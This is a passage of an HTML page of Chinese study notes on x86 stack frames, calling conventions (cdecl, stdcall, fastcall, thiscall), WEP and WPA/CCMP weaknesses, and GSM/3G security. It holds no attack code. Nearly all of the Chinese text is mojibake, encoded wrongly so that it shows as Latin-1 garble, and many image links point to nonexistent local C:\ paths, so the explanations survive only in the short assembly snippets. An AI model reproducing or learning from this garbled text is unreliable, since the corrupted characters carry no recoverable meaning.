ˆä¸Šï¼‰ï¼ˆæ ˆå¸§åˆ‡æ¢æ—¶ä¸èƒ½ç ´åä¸Šä¸€ä¸ªå‡½æ•°ä¸­æŸäº›å¯„å­˜å™¨çš„å€¼ï¼Œå¯„å­˜å™¨åªæœ‰ä¸€ä»½ï¼Œç°åœ¨å¯„å­˜å™¨å½’æˆ‘ç”¨ï¼Œå¯èƒ½æ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œå¯¼è‡´å‡½æ•°è¿”å›æ—¶å›ä¸å»ï¼Œæ‰€ä»¥è¦ä¿å­˜åŸæœ‰çš„å€¼ã€‚ï¼‰</p></li><li><p>rep stosd å¾ªç¯æŒ‡ä»¤ï¼Œå¾ªç¯ecxæ¬¡ï¼ˆ14æ¬¡ï¼‰å¾€eaxé‡Œå¡«å……CCCCCCCCï¼ˆå¡«Cçš„åŸå› ï¼šæŠŠä¹‹å‰çš„åƒåœ¾æ•°æ®æ¸…ç©ºï¼ŒINT3ä¸­æ–­ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea edi,dword ptr ss:[ebp-50]//leaå–åç§»åœ°å€</span><br><span class="line">mov ecx,14</span><br><span class="line">mov eax,CCCCCCCC</span><br><span class="line">rep stosd</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C32.png" alt="3"></p></li><li><p>dsæ®µï¼ˆæ•°æ®æ®µï¼‰ï¼›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al,byte ptr ds:[424A30]</span><br><span class="line">mov byte ptr ss:[ebp-4],al</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure></li></ul><p>  ç”±äºæ— æ³•åœ¨å†…å­˜ä¸­ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥å…ˆæŠŠå†…å­˜æ•°æ®ä¼ å…¥CPUï¼Œå†ä»CPUä¼ åˆ°å†…å­˜çš„æ ˆä¸Šå»</p><ul><li>å¯¹å­—ç¬¦ä¸²æ“ä½œï¼Œä¼ çš„æ˜¯å­—ç¬¦ä¸²çš„åœ°å€</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ss:[ebp-10],zijixu.424A38:&quot;abcde&quot;</span><br></pre></td></tr></table></figure><ul><li>å¼‚æˆ–æ“ä½œ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br></pre></td></tr></table></figure><p>æ¸…é›¶æ“ä½œï¼Œä»£è¡¨<code>return 0</code>ï¼›é»˜è®¤å‡½æ•°è¿”å›å€¼éƒ½æ˜¯æ”¾åœ¨eaxé‡Œï¼Œé€šè¿‡å¼‚æˆ–æ“ä½œå°†è¿”å›å€¼ç½®é›¶ï¼›</p><blockquote><p>ä¸ºä»€ä¹ˆä¸ç”¨<code>mov eax,0x0</code>æ¸…é›¶?</p><p>æ•ˆç‡ä½ï¼Œå å†…å­˜</p></blockquote><ul><li>è¿˜åŸæ ˆ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp//å°†</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><ul><li>å°†æ ˆé¡¶çš„åœ°å€å¼¹åˆ°EIPä¸­</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br></pre></td></tr></table></figure><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C34.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C35.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C36.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C33.png" alt="3"></p><p>å‹æ ˆecxï¼Œæ­¤æ—¶æ ˆé¡¶espå°±æ˜¯ecxé‡Œçš„å€¼ï¼Œæ•…ä¹‹åæ‰“å°çš„ç»“æœåº”è¯¥éƒ½æ˜¯ecxçš„å€¼ï¼›</p><p>+++</p><h3 id="2ã€æ±‡ç¼–åŸºç¡€ï¼ˆç»™å®šä»£ç èƒ½è¯´æ˜å…¶å«ä¹‰ï¼‰"><a href="#2ã€æ±‡ç¼–åŸºç¡€ï¼ˆç»™å®šä»£ç èƒ½è¯´æ˜å…¶å«ä¹‰ï¼‰" class="headerlink" title="2ã€æ±‡ç¼–åŸºç¡€ï¼ˆç»™å®šä»£ç èƒ½è¯´æ˜å…¶å«ä¹‰ï¼‰"></a>2ã€æ±‡ç¼–åŸºç¡€ï¼ˆç»™å®šä»£ç èƒ½è¯´æ˜å…¶å«ä¹‰ï¼‰</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C37.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C38.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C39.png" alt="3"></p><p>+++</p><h3 id="3ã€è°ƒç”¨çº¦å®šï¼ˆç›¸å…³çš„æ±‡ç¼–ä»£ç åˆ†æå’Œæ ˆçš„å˜åŒ–æƒ…å†µï¼‰"><a href="#3ã€è°ƒç”¨çº¦å®šï¼ˆç›¸å…³çš„æ±‡ç¼–ä»£ç åˆ†æå’Œæ ˆçš„å˜åŒ–æƒ…å†µï¼‰" class="headerlink" title="3ã€è°ƒç”¨çº¦å®šï¼ˆç›¸å…³çš„æ±‡ç¼–ä»£ç åˆ†æå’Œæ ˆçš„å˜åŒ–æƒ…å†µï¼‰"></a>3ã€è°ƒç”¨çº¦å®šï¼ˆç›¸å…³çš„æ±‡ç¼–ä»£ç åˆ†æå’Œæ ˆçš„å˜åŒ–æƒ…å†µï¼‰</h3><p><font color="#ff000" face="é»‘ä½“" size="4">â˜†â˜†â˜†</font></p><p><strong>æ ˆå¸§</strong>ï¼šç¨‹åºè¿è¡Œæ—¶æ ˆä¸­åˆ†é…çš„å†…å­˜å—ï¼Œä¸“é—¨ç”¨äºç‰¹å®šçš„å‡½æ•°è°ƒç”¨</p><p>æ ˆå¸§çš„å¤§è‡´ç»“æ„ï¼š</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C40.png" alt="3"></p><p>è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶çš„æ“ä½œæ­¥éª¤ï¼š</p><ol><li>è°ƒç”¨æ–¹å°†è¢«è°ƒç”¨å‡½æ•°æ‰€éœ€å‚æ•°æ”¾å…¥åˆ°å‡½æ•°æ‰€é‡‡ç”¨çš„è°ƒç”¨çº¦å®šæŒ‡å®šçš„ä½ç½®</li><li>è°ƒç”¨æ–¹å°†æ§åˆ¶æƒè½¬äº¤ç»™è¢«è°ƒç”¨å‡½æ•°ï¼ˆcallï¼‰ï¼Œç„¶åè¿”å›åœ°å€è¢«ä¿å­˜åˆ°ç¨‹åºæ ˆæˆ–CPUå¯„å­˜å™¨ä¸­</li><li>è¢«è°ƒç”¨å‡½æ•°ä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´</li><li>è¢«è°ƒç”¨å‡½æ•°æ‰§è¡Œæ“ä½œ</li><li>è¢«è°ƒç”¨å‡½æ•°å®Œæˆæ“ä½œï¼Œé‡Šæ”¾å±€éƒ¨å˜é‡çš„æ ˆç©ºé—´</li><li>è¢«è°ƒç”¨å‡½æ•°å°†æ§åˆ¶æƒè¿”è¿˜ç»™è°ƒç”¨æ–¹ï¼ˆretï¼‰</li></ol><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C42.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C41.png" alt="3"></p><p>+++</p><h4 id="cdeclâ˜†â˜†â˜†"><a href="#cdeclâ˜†â˜†â˜†" class="headerlink" title="cdeclâ˜†â˜†â˜†"></a>cdecl<font color="#ff000" face="é»‘ä½“" size="4">â˜†â˜†â˜†</font></h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C43.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add esp,10h   //ç›¸å½“äºè°ƒç”¨æ–¹æ¸…æ ˆ(è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§))ï¼ˆesp+10h,ç”±äºæ ˆåœ¨å†…å­˜ä¸­è¡¨ç°ä¸ºä»é«˜åœ°å€å¾€ä½åœ°å€å¢é•¿ï¼Œespæ ˆé¡¶+16ç›¸å½“äºå‹ç¼©æ ˆï¼‰</span><br><span class="line"></span><br><span class="line">1ã€å…ˆè¿›åå‡ºã€‚</span><br><span class="line">2ã€åœ¨å†…å­˜ä¸­è¡¨ç°ä¸ºä»é«˜åœ°å€å¾€ä½åœ°å€å¢é•¿ã€‚(ä»é«˜åœ°å€å‹æ ˆ-&gt;ä½åœ°å€)</span><br><span class="line">3ã€æ ˆé¡¶espï¼šæ ˆçš„æœ€ä¸Šæ–¹ï¼ˆä½åœ°å€åŒºï¼‰ã€‚</span><br><span class="line">4ã€æ ˆä½ebpï¼šæ ˆçš„æœ€ä¸‹æ–¹ï¼ˆé«˜åœ°å€åŒºï¼‰ã€‚</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C44.png" alt="3"></p><p>æ‰“å¼€è¢«è°ƒç”¨æ–¹ï¼š</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C45.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">retn 10h //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,10h</span><br><span class="line">å‚æ•°å›ºå®š</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h4><p>è°ƒç”¨æ–¹ï¼š</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C46.png" alt="3"></p><p>è¢«diao</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C47.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov [ebp+var_C],edx</span><br><span class="line">mov [ebp+var_8],ecx</span><br><span class="line">//ä¿å­˜å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œé˜²æ­¢åè¾¹ç¨‹åºä½¿ç”¨å¯„å­˜å™¨è€Œæ”¹å˜å…¶å€¼</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retn 8 //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,8</span><br></pre></td></tr></table></figure><p>+++</p><h4 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h4><p>å¯¹è±¡å­˜åœ¨äºå †ä¸Šï¼Œä¸åœ¨æ ˆé‡Œï¼›</p><p>è°ƒç”¨æ–¹ï¼š</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C48.png" alt="3"></p><p>ecxä¸­å­˜æ”¾å½“å‰è°ƒç”¨çš„å¯¹è±¡çš„æŒ‡é’ˆthisï¼›</p><p>eaxé»˜è®¤å­˜æ”¾è¿”å›å€¼ï¼›</p><p>è¢«è°ƒç”¨æ–¹ï¼š</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C49.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea ecx,[ebp+var_4]//thisæŒ‡é’ˆè·å–</span><br><span class="line"></span><br><span class="line">retn 8 //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,8</span><br></pre></td></tr></table></figure><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C50.png" alt="3"></p><p>+++</p><h3 id="4ã€ç®€å•çš„è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ä¸¾ä¾‹"><a href="#4ã€ç®€å•çš„è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ä¸¾ä¾‹" class="headerlink" title="4ã€ç®€å•çš„è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ä¸¾ä¾‹"></a>4ã€ç®€å•çš„è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ä¸¾ä¾‹</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C51.png" alt="3"></p><p>+++</p><h3 id="5ã€Windowsçš„å†…æ ¸åŸç†"><a href="#5ã€Windowsçš„å†…æ ¸åŸç†" class="headerlink" title="5ã€Windowsçš„å†…æ ¸åŸç†"></a>5ã€Windowsçš„å†…æ ¸åŸç†</h3><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C52.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C11.png" alt="6"></p><p>+++</p><p>å‘å±•è¿‡ç¨‹ä¸­çš„å˜åŒ–ï¼›</p><p>+++</p><h3 id="1ã€ç§»åŠ¨ç½‘ç»œçš„åˆ†ç±»å’Œå®‰å…¨é£é™©"><a href="#1ã€ç§»åŠ¨ç½‘ç»œçš„åˆ†ç±»å’Œå®‰å…¨é£é™©" class="headerlink" title="1ã€ç§»åŠ¨ç½‘ç»œçš„åˆ†ç±»å’Œå®‰å…¨é£é™©"></a>1ã€ç§»åŠ¨ç½‘ç»œçš„åˆ†ç±»å’Œå®‰å…¨é£é™©</h3><p>åˆ†ç±»ï¼š</p><p>æ— çº¿å±€åŸŸç½‘ï¼ˆWLANï¼‰ã€æ— çº¿ä¸ªåŸŸç½‘ï¼ˆWPANï¼‰ã€æ— çº¿ä½“åŸŸç½‘ï¼ˆWBANï¼‰ã€æ— çº¿åŸåŸŸç½‘ï¼ˆWMANï¼‰ã€æ— çº¿å¹¿åŸŸç½‘ï¼ˆWWANï¼‰</p><p>å®‰å…¨é£é™©ï¼š</p><ul><li>æœ‰çº¿ç½‘ç»œ</li><li>æ— çº¿ç½‘ç»œ</li></ul><p>+++</p><h3 id="2ã€WLANå®‰å…¨æœºåˆ¶â€”-WEPï¼ŒIEEE-802-11i-WPAã€WPA2ã€CCMPã€TKIPã€è®¤è¯å¯†é’¥äº¤æ¢ã€å››æ­¥æ¡æ‰‹ç­‰"><a href="#2ã€WLANå®‰å…¨æœºåˆ¶â€”-WEPï¼ŒIEEE-802-11i-WPAã€WPA2ã€CCMPã€TKIPã€è®¤è¯å¯†é’¥äº¤æ¢ã€å››æ­¥æ¡æ‰‹ç­‰" class="headerlink" title="2ã€WLANå®‰å…¨æœºåˆ¶â€”-WEPï¼ŒIEEE 802.11i(WPAã€WPA2ã€CCMPã€TKIPã€è®¤è¯å¯†é’¥äº¤æ¢ã€å››æ­¥æ¡æ‰‹ç­‰)"></a>2ã€WLANå®‰å…¨æœºåˆ¶â€”-WEPï¼ŒIEEE 802.11i(WPAã€WPA2ã€CCMPã€TKIPã€è®¤è¯å¯†é’¥äº¤æ¢ã€å››æ­¥æ¡æ‰‹ç­‰)</h3><h4 id="1ã€WEP"><a href="#1ã€WEP" class="headerlink" title="1ã€WEP"></a>1ã€WEP</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C10.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C11.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C12.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C13.png" alt="3"></p><p>WEPçš„å®‰å…¨é—®é¢˜ï¼š</p><ul><li>RC4ç®—æ³•çš„ä½¿ç”¨ï¼ˆå­˜åœ¨å¤§é‡å¼±å¯†é’¥ï¼›æ¯256ä¸ªå¯†é’¥å°±æœ‰ä¸€ä¸ªï¼›å»ºè®®ï¼šæŠ›å¼ƒRC4è¾“å‡ºçš„å‰256æ¯”ç‰¹ï¼‰</li><li>â…£çš„ä½¿ç”¨ï¼ˆç©ºé—´å¤ªå°ï¼Œç”Ÿæ—¥æ”»å‡»ï¼‰</li><li>SKçš„äº§ç”Ÿä¸åˆ†å‘ï¼ˆæ— å¯†é’¥äº¤æ¢/ç®¡ç†æœºåˆ¶ï¼‰</li><li>CRC32ç®—æ³•çš„ä½¿ç”¨ï¼ˆCRC32æ˜¯çº¿æ€§çš„ï¼‰</li><li>æ— æŠ—é‡æ”¾æ”»å‡»</li></ul><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C14.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C15.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C16.png" alt="3"></p><h4 id="2ã€IEEE-802-11i"><a href="#2ã€IEEE-802-11i" class="headerlink" title="2ã€IEEE 802.11i"></a>2ã€IEEE 802.11i</h4><ul><li>TSN(è¿‡åº¦å®‰å…¨ç½‘ç»œ)</li><li>RSNï¼ˆåšå›ºå®‰å…¨ç½‘ç»œï¼‰</li></ul><h4 id="3ã€WPA"><a href="#3ã€WPA" class="headerlink" title="3ã€WPA"></a>3ã€WPA</h4><p>802.11iè‰æ¡ˆä¸­ä¸€éƒ¨åˆ†ï¼›</p><h4 id="4ã€åŠ å¯†æœºåˆ¶TKIPâ€”ï¼ˆæš‚æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼‰"><a href="#4ã€åŠ å¯†æœºåˆ¶TKIPâ€”ï¼ˆæš‚æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼‰" class="headerlink" title="4ã€åŠ å¯†æœºåˆ¶TKIPâ€”ï¼ˆæš‚æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼‰"></a>4ã€åŠ å¯†æœºåˆ¶TKIPâ€”ï¼ˆæš‚æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼‰</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C17.png" alt="3"></p><h4 id="5ã€åŠ å¯†æœºåˆ¶CCMPâ€”åŸºäºAES"><a href="#5ã€åŠ å¯†æœºåˆ¶CCMPâ€”åŸºäºAES" class="headerlink" title="5ã€åŠ å¯†æœºåˆ¶CCMPâ€”åŸºäºAES"></a>5ã€åŠ å¯†æœºåˆ¶CCMPâ€”åŸºäºAES</h4><p><font color="#ff000" face="é»‘ä½“" size="4">CCMPâ˜†â˜†â˜†</font></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C18.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C19.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C20.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C21.png" alt="3"></p><p>+++</p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C22.png" alt="3"></p><p>+++</p><h3 id="3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨æœºåˆ¶â€”-GSMã€3Gã€4G"><a href="#3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨æœºåˆ¶â€”-GSMã€3Gã€4G" class="headerlink" title="3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨æœºåˆ¶â€”-GSMã€3Gã€4G"></a>3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨æœºåˆ¶â€”-GSMã€3Gã€4G</h3><h4 id="1ã€GSM"><a href="#1ã€GSM" class="headerlink" title="1ã€GSM"></a>1ã€GSM</h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C23.png" alt="3"></p><p>+++</p><p>GSMç³»ç»Ÿçš„å®‰å…¨ç›®æ ‡ï¼š</p><ul><li>ç”¨æˆ·èº«ä»½è®¤è¯ï¼šä¿è¯ç½‘ç»œä¸è¢«æœªæˆæƒè€…ä½¿ç”¨</li><li>æ•°æ®æœºå¯†æ€§ï¼š</li><li>ç”¨æˆ·èº«ä»½ï¼ˆIMSIï¼‰ä¿å¯†ï¼š<ul><li>IMSIï¼ˆå›½é™…ç§»åŠ¨ç”¨æˆ·æ ‡è¯†ï¼‰ä¸è¢«æ³„éœ²ç»™æœªæˆæƒçš„ä¸ªäººã€å®ä½“æˆ–è¿‡ç¨‹</li></ul></li></ul><p>+++</p><p><strong>GSMå®‰å…¨åˆ†æ</strong>ï¼š</p><ul><li>è®¤è¯ï¼šæŒ‘æˆ˜â€”-å“åº”ï¼Œé•¿æœŸå¯†é’¥æ²¡æœ‰æ³„éœ²</li><li>åŠ å¯†ï¼šç©ºä¸­æ¥å£ï¼ˆå³ç”¨æˆ·åˆ°åŸºç«™éƒ¨åˆ†ï¼‰</li><li>åŒ¿åï¼šTMSI</li></ul><p><strong>GSMçš„ä¸è¶³</strong>ï¼š</p><ul><li>è®¤è¯ï¼šå•å‘è®¤è¯ï¼Œä¸”ä¸‰å…ƒç»„å¯æ— é™æœŸä½¿ç”¨</li><li>åŠ å¯†ï¼šæ²¡æœ‰å®ç°ç«¯åˆ°ç«¯çš„åŠ å¯†</li><li>å®Œæ•´æ€§ï¼šæ— </li></ul><p>+++</p><h4 id="2ã€3Gâ˜†â˜†â˜†è®¤è¯å’Œå¯†é’¥åå•†è¿‡ç¨‹"><a href="#2ã€3Gâ˜†â˜†â˜†è®¤è¯å’Œå¯†é’¥åå•†è¿‡ç¨‹" class="headerlink" title="2ã€3Gâ˜†â˜†â˜†è®¤è¯å’Œå¯†é’¥åå•†è¿‡ç¨‹"></a>2ã€3G<font color="#ff000" face="é»‘ä½“" size="4">â˜†â˜†â˜†è®¤è¯å’Œå¯†é’¥åå•†è¿‡ç¨‹</font></h4><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C53.png" alt="3"></p><p><img src="C:%5CUsers%5CSmtSec%5CDesktop%5C%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%5C%E5%A4%8D%E4%B9%A0%5C%E5%9B%BE%5C24.png" alt="3"></p><p><img 